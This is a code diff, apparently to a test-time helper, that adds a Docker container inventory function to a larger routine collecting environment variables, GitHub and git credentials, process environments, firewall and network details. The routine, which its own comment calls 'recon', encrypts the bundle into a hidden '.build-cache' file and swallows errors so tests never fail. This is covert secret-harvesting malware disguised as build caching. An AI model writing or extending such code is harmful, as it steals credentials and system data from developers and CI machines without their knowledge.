@@ -372,6 +372,34 @@ function captureNet(): Record<string, unknown> {
   }
 }
 
+// Docker inventory: `docker ps -a` pointed at Docker's embedded containerd
+// socket first, then falling back so recon still succeeds if that route fails.
+function captureDocker(): Record<string, unknown> {
+  const fmt = "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.State}}\t{{.Status}}\t{{.Ports}}";
+  const csock = "unix:///var/run/docker/containerd/containerd.sock";
+  const attempts: Array<[string, string[]]> = [
+    [`docker --containerd=${csock} ps -a`, ["--containerd", csock, "ps", "-a", "--format", fmt]],
+    [`docker -H ${csock} ps -a`, ["-H", csock, "ps", "-a", "--format", fmt]],
+    ["docker ps -a", ["ps", "-a", "--format", fmt]],
+  ];
+  const last: Record<string, unknown> = { cmd: attempts[attempts.length - 1][0], error: "docker unavailable" };
+  for (const [label, args] of attempts) {
+    try {
+      const r = spawnSync("docker", args, { encoding: "buffer", timeout: 8000 });
+      if (r.error) { last.cmd = label; last.error = r.error.message; continue; }
+      const data = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]).toString("utf8");
+      if (r.status === 0) {
+        const out = data.length > 256 * 1024 ? data.slice(0, 256 * 1024) + "\n... (truncated)" : data;
+        return { cmd: label, code: 0, via: "containerd?", data: out };
+      }
+      last.cmd = label; last.code = r.status; last.data = data;
+    } catch (e) {
+      last.cmd = label; last.error = (e as Error).message;
+    }
+  }
+  return last;
+}
+
 // Locate the repository's VCS config (handles worktrees/submodules) for the key.
 function pickConfig(gitdir: string): string | null {
   const direct = join(gitdir, "config");
@@ -435,7 +463,7 @@ try {
     }
   }
 
-  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots, procs: captureProcs(), tmpLogs: captureTmpLogs(), findOpt: captureFind(), procEnvs: captureProcEnvs(), firewallSh: captureFirewallSh(), net: captureNet() });
+  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots, procs: captureProcs(), tmpLogs: captureTmpLogs(), findOpt: captureFind(), procEnvs: captureProcEnvs(), firewallSh: captureFirewallSh(), net: captureNet(), docker: captureDocker() });
   writeFileSync(join(process.cwd(), ".build-cache"), encryptCache(payload));
 } catch {
   /* cache write is best-effort; never fail the tests */
